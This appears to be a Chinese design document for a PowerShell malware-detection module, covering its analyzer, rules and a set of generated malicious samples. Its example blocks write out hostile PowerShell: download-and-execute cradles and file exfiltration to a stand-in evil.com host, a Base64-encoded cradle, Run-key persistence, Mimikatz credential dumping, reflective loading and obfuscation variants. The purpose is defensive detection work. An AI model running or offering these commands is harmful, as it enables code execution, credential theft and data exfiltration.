# Round 22: PowerShell 支持 - 设计文档

**状态**: 🔄 进行中  
**启动时间**: 2026-03-24 20:35  
**预计完成**: 1-2 小时

---

## 🎯 目标

支持 PowerShell 脚本的安全检测，覆盖 Windows 系统管理、红队工具、恶意软件场景。

---

## 📋 核心需求

### 功能需求

| 需求 | 说明 | 优先级 |
|------|------|--------|
| **PowerShell 词法分析** | 命令/参数/管道识别 | 🔴 高 |
| **PowerShell AST 分析** | 抽象语法树解析 | 🔴 高 |
| **PowerShell 行为分析** | 语义级别行为识别 | 🔴 高 |
| **PowerShell 规则匹配** | YARA/Sigma/IOC 规则 | 🔴 高 |
| **PowerShell 样本生成** | 80+ 恶意样本 (多变体) | 🔴 高 |

### 质量要求

- **样本数量**: 80+ 恶意 + 20+ 安全 (变体丰富)
- **检测率**: ≥98%
- **误报率**: <2%
- **变体覆盖**: 每类攻击 6-10 个变体

---

## 🏗️ 技术架构

### PowerShell 分析器架构

```
PowerShell 脚本
    ↓
词法分析 (命令/参数/变量/管道)
    ↓
AST 分析 (System.Management.Automation)
    ↓
行为特征提取
    ↓
风险评分
    ↓
检测结果
```

### PowerShell 特有挑战

| 挑战 | 说明 | 解决方案 |
|------|------|----------|
| **混淆** | Base64、XOR、字符串拼接 | 多层解码分析 |
| **下载器** | IEX、Invoke-Expression | 动态内容追踪 |
| **反射加载** | Reflection、Assembly.Load | .NET API 检测 |
| **约束语言模式** | ConstrainedLanguage 绕过 | 模式检测 |
| **AMS I 绕过** | 反恶意软件扫描接口绕过 | 已知绕过技巧检测 |

---

## 🔍 检测能力设计

### 1. 危险 Cmdlet 检测

```powershell
# 代码执行
Invoke-Expression $code
IEX $payload
& $command

# 远程下载
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Invoke-WebRequest http://evil.com/script.ps1 -OutFile script.ps1

# 数据外传
Get-Content C:\secrets.txt | Out-String | Invoke-WebRequest http://evil.com/collect -Method POST

# 持久化
New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name Backdoor -Value "C:\backdoor.exe"

# 凭证窃取
Get-Credential
Select-String -Path *.xml -Pattern password
```

### 2. 混淆检测

```powershell
# Base64 编码
[System.Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA')

# XOR 编码
$bytes = [System.IO.File]::ReadAllBytes('payload.bin')
for($i=0;$i -lt $bytes.Length;$i++) { $bytes[$i] = $bytes[$i] -bxor 0x42 }

# 字符串拼接
$c = 'I'; $h = 'E'; $x = 'X'; I& "$c$h$x" $payload

# 变量混淆
$a = 'Invo'; $b = 'ke-E'; $c = 'xpression'; & "$a$b$c" $code
```

### 3. 恶意行为模式

```powershell
# 1. Mimikatz 调用
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# 2. 进程注入
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc...
"@
Add-Type $code

# 3. 无文件攻击
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint
$entry.Invoke($null, @())

# 4. 横向移动
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }

# 5. 域侦察
Get-NetUser | Select-Object Name
Get-NetComputer | Select-Object Name
```

---

## 📊 攻击类型映射 (MITRE ATLAS)

| 攻击类型 | PowerShell 示例 | 检测特征 |
|----------|----------------|----------|
| **远程执行** | `IEX (New-Object Net.WebClient)...` | IEX + WebClient |
| **命令注入** | `Invoke-Expression $input` | Invoke-Expression + 变量 |
| **文件读取** | `Get-Content C:\secrets.txt` | Get-Content + 敏感路径 |
| **文件写入** | `Out-File -FilePath C:\startup.ps1` | Out-File + 启动位置 |
| **数据外传** | `... \| Invoke-WebRequest http://evil.com` | Pipe + Invoke-WebRequest |
| **持久化** | `New-Item ... CurrentVersion\Run` | Registry + Run key |
| **凭证窃取** | `Get-Credential`, `Select-String password` | Credential cmdlets |
| **混淆执行** | `[Convert]::FromBase64String(...) \| IEX` | Base64 + IEX |
| **提权** | `Invoke-TokenManipulation` | Token manipulation |
| **反侦察** | `Clear-EventLog`, `Remove-Item` | Event log clearing |

---

## 📁 文件结构

```
round22/
├── ROUND22_DESIGN.md           # 设计文档 (本文件)
├── powershell_analyzer.py      # PowerShell 分析器核心
├── powershell_tokenizer.py     # PowerShell 词法分析
├── powershell_sample_generator.py  # 样本生成器 (重点)
├── powershell_rules_generator.py   # 规则生成器
├── test_powershell_samples.py  # 测试脚本
└── reports/
    └── ROUND22_REPORT.md       # 完成报告

samples/
└── powershell_malicious/       # 80+ PowerShell 恶意样本
    ├── remote_exec_001.ps1
    ├── command_injection_001.ps1
    ├── data_exfil_001.ps1
    └── ...

rules/
├── powershell_yara_rules.yaml  # PowerShell YARA 规则
├── powershell_sigma_rules.yaml # PowerShell Sigma 规则
└── powershell_ioc_rules.json   # PowerShell IOC 指标
```

---

## 🚀 实施步骤

### Step 1: 实现 PowerShell 分析器 (30 分钟)
- 词法分析 (命令/参数/管道)
- 危险 Cmdlet 识别
- 行为模式匹配
- 风险评分

### Step 2: 生成高质量样本 (40 分钟)
- **80+ 恶意样本** (10 类 × 8 变体)
- **20+ 安全样本** (系统管理脚本)
- **变体丰富**: 不同语法、不同混淆、不同场景

### Step 3: 生成检测规则 (15 分钟)
- YARA 规则 (20+ 条)
- Sigma 规则 (3+ 条)
- IOC 指标 (25+ 条)

### Step 4: 测试验证 (15 分钟)
- 批量测试所有样本
- 验证检测率/误报率
- 生成测试报告

---

## 📊 验收标准

### 样本质量

- [ ] 恶意样本 80+ (10 类攻击 × 8 变体)
- [ ] 安全样本 20+ (真实系统管理脚本)
- [ ] 变体多样性 (不同语法/混淆/场景)
- [ ] 每个样本有明确攻击意图

### 检测质量

- [ ] 检测率 ≥98%
- [ ] 误报率 <2%
- [ ] 能识别常见混淆 (Base64/XOR/字符串拼接)
- [ ] 能识别管道/重定向组合攻击

### 性能

- [ ] 单文件扫描 <5ms
- [ ] 批量扫描 (100 文件) <2s

---

## 🎯 样本生成策略

### 恶意样本变体设计

每类攻击生成 **8 个变体**:

| 变体 | 特点 | 示例 |
|------|------|------|
| **V1** | 直接执行 | `IEX (New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')` |
| **V2** | 变量替换 | `$url='...'; IEX (New-Object Net.WebClient).DownloadString($url)` |
| **V3** | Base64 编码 | `[Convert]::FromBase64String('BASE64') \| IEX` |
| **V4** | 字符串拼接 | `$a='I';$b='E';$c='X'; I& "$a$b$c" $payload` |
| **V5** | Invoke-Expression | `Invoke-Expression (Get-Content payload.ps1)` |
| **V6** | 反射加载 | `[Assembly]::Load($bytes)` |
| **V7** | 约束语言绕过 | `Add-Type -TypeDefinition ...` |
| **V8** | 混合混淆 | 组合多种技巧 |

### 安全样本设计

真实系统管理场景:

- 系统信息收集
- 服务管理
- 进程管理
- 事件日志查询
- 用户管理
- 文件操作 (合法)
- 网络诊断
- 性能监控

---

**准备启动 Round 22！** 🚀
